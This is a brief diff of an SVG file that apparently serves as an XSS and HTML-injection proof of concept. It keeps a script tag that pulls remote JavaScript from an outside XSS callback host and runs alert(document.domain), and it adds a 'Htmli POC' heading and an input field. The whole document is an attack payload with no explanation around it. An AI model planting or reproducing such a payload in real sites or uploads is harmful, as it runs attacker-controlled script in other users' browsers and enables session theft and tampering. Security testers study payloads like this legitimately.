@@ -6,4 +6,6 @@
    <script src="https://xss.report/s/koanti">
       alert(document.domain);
    </script>
+   <h1>Htmli POC</h1>
+   <input type="text" name="user">
 </svg>
